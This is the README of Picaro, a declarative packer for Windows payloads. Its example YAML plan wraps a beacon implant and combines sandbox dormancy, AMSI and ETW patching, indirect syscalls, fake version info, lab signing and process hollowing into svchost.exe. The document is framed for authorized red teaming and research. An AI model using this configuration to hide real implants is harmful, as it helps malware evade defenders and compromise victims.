<p align="center">
  <img src="docs/assets/full-logo-512.webp" alt="Picaro: a joker card bearing the Picaro jester and a P corner index" height="300" />
</p>

**Declarative evasion for Windows payloads**

Picaro takes a PE file and a YAML plan and emits a packed PE with the selected
evasion techniques baked into a freshly generated Rust stub. No cleartext
payload ever touches disk: it is authenticated-encrypted at build time and only
ever exists decrypted in memory at run time.

## Authorized use only

For **authorized red team engagements, lab environments and security research**.
You are responsible for what you build with it.

## Quick start (Python + Docker)

You only need **Docker** and **Python**. The wrapper builds the image on first
use and packs the plan:

```bash
python scripts/picaro.py build examples/plans/process-hollowing.yaml
python scripts/picaro.py audit dist/test_packed.exe
python scripts/picaro.py techniques list
```

The container cross-compiles the Windows PE, so run the resulting artifact on a
Windows host. See [`docs/`](docs/) for the full Docker details.

## Build a payload

A build is one YAML document. `build.payloads` maps a name to your binary,
`build.stub` holds loader-wide settings (the syscall layer, string obfuscation),
`build.output` places the artifact and can embed resources and sign it, and the
top-level `runtime` list is the ordered chain the stub walks — preparation
techniques first, then the execution technique that runs the payload:

```yaml
schema: 6
name: demo

build:
  # Named payloads
  payloads:
    implant:
      source: ./beacon.exe          
  # Loader
  stub:
    syscalls: 
      mode: indirect
      resolver: tartarus_gate 
    strings: 
      strategy: xor
      key: random 
  output:
    path: ./dist/beacon_packed.exe
    resources:
      icon: ./examples/assets/sample.ico
      version_info: 
        randomize: true                  # Fake Company, ProductName, Version...etc
    sign: { mode: lab }                  # Create CA and sign the binary

# One ordered chain: preparations run first, then the payload.
runtime:
  - technique: bouncer                   # stay dormant off-target / in a sandbox
    params:
      require:
        - ram_mb: 2048
      anti_analysis:
        sandbox: true

  - technique: patch_amsi                # neutralize AMSI in the loader's process
  - technique: patch_etw                 # and ETW, before anything runs

  - technique: process_hollowing         # run the PE inside a signed host process
    params:
      payload: implant
      target: "C:\\Windows\\System32\\svchost.exe"
```

```bash
python scripts/picaro.py build plan.yaml
```

## Examples

Ready-to-run plans live in [`examples/plans/`](examples/plans) (process
hollowing, reflective loading, indirect syscalls, .NET, DLL output, shellcode,
preparations, signing, x86, …), with payloads in
[`examples/payloads/`](examples/payloads). Start there and point `source` at
your own binary.

## Documentation

Full docs live in [`docs/`](docs/) (`python scripts/docs.py` previews the site).
